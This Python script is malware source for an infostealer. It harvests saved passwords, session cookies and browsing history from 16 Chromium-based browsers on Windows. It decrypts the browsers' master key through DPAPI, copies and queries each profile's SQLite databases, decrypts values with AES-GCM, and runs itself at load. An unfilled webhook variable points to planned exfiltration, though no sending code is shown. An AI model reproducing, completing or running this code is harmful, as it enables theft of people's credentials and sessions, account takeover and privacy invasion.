import json
import os
import base64 # to hide token link
import shutil
import sqlite3

from Crypto.Cipher import AES # using pycryptodome

from win32.win32crypt import CryptUnprotectData #using win32crypt from pywin32?


webhookLink = "fill"
appdata = os.getenv("LOCALAPPDATA")
local_appdata = os.getenv("LOCALAPPDATA")

logins = []
cookies = []
history = []

# perhaps use os.join instead of +,
# also get more pathes (or add "raw" versions of the path)

browser_paths = [
    appdata + '\\Amigo\\User Data',
    appdata + '\\Torch\\User Data',
    appdata + '\\Kometa\\User Data',
    appdata + '\\Orbitum\\User Data',
    appdata + '\\CentBrowser\\User Data',
    appdata + '\\7Star\\7Star\\User Data',
    appdata + '\\Sputnik\\Sputnik\\User Data',
    appdata + '\\Vivaldi\\User Data',
    appdata + '\\Google\\Chrome SxS\\User Data',
    appdata + '\\Google\\Chrome\\User Data',
    appdata + '\\Epic Privacy Browser\\User Data',
    appdata + '\\Microsoft\\Edge\\User Data',
    appdata + '\\uCozMedia\\Uran\\User Data',
    appdata + '\\Yandex\\YandexBrowser\\User Data',
    appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    appdata + '\\Iridium\\User Data',
]

profiles = [
    "Default",
    "Profile 1",
    "Profile 2",
    "Profile 3",
    "Profile 4",
    "Profile 5",
]

def a_little_bit_of_trolling():
    global logins, cookies, history

    for path in browser_paths:
        try:
            master_key = get_master_key(path + "\\Local State")

            for profile in profiles:
                try:
                    get_login_data(path, profile, master_key)
                    get_cookies(path, profile, master_key)
                    get_browser_history(path, profile, master_key)
                except Exception as e:
                    pass
        except Exception as e:
            pass
    return logins, cookies, history


def get_login_data(path, profile, master_key):
    global logins
    login_db = path + "\\" + profile + "\\Login Data"

    shutil.copy(login_db, "login_db_copy")
    con = sqlite3.connect("login_db_copy")
    cur = con.cursor()

    res = cur.execute(r"SELECT action_url, username_value, password_value FROM logins")
    for i in res:
        password = decrypt_val(i[2], master_key)
        w = [i[0], i[1], password]
        logins.append(w)
    con.close()
    os.remove("login_db_copy")


def get_cookies(path, profile, master_key):
    global cookies
    cookie_db = path + "\\" + profile + "\\Network\\Cookies"

    shutil.copy(cookie_db, "cookie_db_copy")
    con = sqlite3.connect("cookie_db_copy")
    cur = con.cursor()
    res = cur.execute(r"SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
    for i in res:
        cookie = decrypt_val(i[3], master_key)
        cookies.append([i[0], i[1], i[2], cookie, i[4]])
    con.close()
    os.remove("cookie_db_copy")

def get_browser_history(path, profile, master_key):
    global history
    history_db = path + "\\" + profile + "\\History"
    shutil.copy(history_db, "history_db_copy")
    con = sqlite3.connect("history_db_copy")
    cur = con.cursor()
    res = cur.execute(r"SELECT url, title, last_visit_time FROM urls")
    # add sorting based on time?
    for i in res:
        history.append([i[0], i[1], i[2]])
    
    con.close()
    os.remove("history_db_copy")
        
def get_master_key(path):
    with open(path, 'r', errors='ignore') as file:
        JSON_str = file.read()
    jason = json.loads(JSON_str)

    master_key = base64.b64decode(jason["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

    return master_key

def decrypt_val(input: bytes, master_key: bytes) -> str:
    iv = input[3:15] #initialization vector
    payload = input[15:] 
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_value = cipher.decrypt(payload)
    decrypted_value = decrypted_value[:-16].decode() #so input length dont matter
    return decrypted_value

a_little_bit_of_trolling()
